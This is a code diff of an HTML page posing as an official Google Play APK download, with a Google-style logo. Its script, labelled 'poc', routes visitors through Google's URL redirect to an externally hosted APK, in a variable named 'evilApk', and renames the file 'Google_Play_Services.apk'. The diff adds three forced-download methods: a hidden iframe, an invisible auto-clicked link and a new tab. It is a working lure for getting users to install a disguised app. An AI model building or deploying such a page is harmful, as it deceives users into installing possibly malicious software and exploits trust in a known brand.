@@ -4,7 +4,7 @@
   <title>Google Play – Official APK</title>
   <style>
     body{font-family:Arial;background:#fff;text-align:center;padding:60px;}
-    .box{background:#f9f9f9;padding:30px;border-radius:12px;box-shadow:0 2px 8px rgba(0,0,0,.1);display:inline-block;}
+    .box{background:#f9f9f9;padding:30px;border-radius:12px;box-shadow:0 2px 8px rgba(0,0,0,.1);display:inline-block;max-width:400px;}
     .logo{width:72px;height:72px;background:url('data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 24 24%22><path fill=%22%231a73e8%22 d=%22M22.5 12c0-5.25-4.05-9.525-9.225-9.975v1.95c4.41.42 7.875 4.005 7.875 8.475s-3.465 8.055-7.875 8.475v1.95C18.45 21.525 22.5 17.25 22.5 12z%22/><path fill=%22%2334a853%22 d=%22M12 3.525C7.05 3.525 3 7.575 3 12.525c0 4.95 4.05 9 9 9v-1.95c-4.41-.42-7.875-4.005-7.875-8.475s3.465-8.055 7.875-8.475V3.525z%22/><path fill=%22%23ea4335%22 d=%22M12 3.525v1.95c4.41.42 7.875 4.005 7.875 8.475s-3.465 8.055-7.875 8.475v1.95c4.95-.45 9-4.725 9-9.975s-4.05-9.525-9-9.975z%22/><path fill=%22%23fbbc05%22 d=%22M12 3.525C7.05 3.525 3 7.575 3 12.525c0 4.95 4.05 9 9 9v-1.95c-4.41-.42-7.875-4.005-7.875-8.475s3.465-8.055 7.875-8.475V3.525z%22/></svg>') center/contain no-repeat;margin:0 auto 20px;}
     h1{font-size:22px;color:#1a73e8;margin:0 0 10px;}
     p{font-size:15px;color:#5f6368;margin:0 0 25px;}
@@ -25,25 +25,26 @@
 
   <script>
     function poc(){
-      // Base64-encoded HTML that instantly redirects + forces filename
-      const b64 = btoa(`
-<!DOCTYPE html>
-<html>
-<head>
-<meta http-equiv="refresh" content="0;url=https://ybt01.github.io/upload/app-debug.apk">
-<meta http-equiv="Content-Disposition" content="attachment; filename=Google_Play_Services_official.apk">
-<title>Google Play</title>
-</head>
-<body>Redirecting…</body>
-</html>
-      `.trim());
+      // Direct Google redirect to your APK (original method)
+      const evilApk = "https://ybt01.github.io/upload/app-debug.apk";
+      const googleUrl = `https://www.google.com/url?q=${encodeURIComponent(evilApk)}&sa=D&source=hangouts&ust=${Date.now()}&usg=AOvVaw3nm-qJSzcGfjAOwSO0tcBK`;
 
-      // Google /url → data:URL (self-contained, no extra file)
-      const google = `https://www.google.com/url?q=data:text/html;base64,${b64}&sa=D&source=hangouts&ust=${Date.now()}&usg=AOvVaw3nm-qJSzcGfjAOwSO0tcBK`;
-      document.getElementById('ifr').src = google;
+      // Method 1: Trigger download via hidden iframe
+      document.getElementById('ifr').src = googleUrl;
 
-      // Open in new tab for maximum trust
-      setTimeout(() => window.open(google,'_blank'), 300);
+      // Method 2: Force via invisible link click (fallback)
+      setTimeout(() => {
+        const a = document.createElement('a');
+        a.href = googleUrl;
+        a.download = 'Google_Play_Services.apk';
+        a.style.display = 'none';
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+      }, 300);
+
+      // Method 3: Open in new tab (user sees Google redirect)
+      window.open(googleUrl, '_blank');
     }
   </script>
 </body>
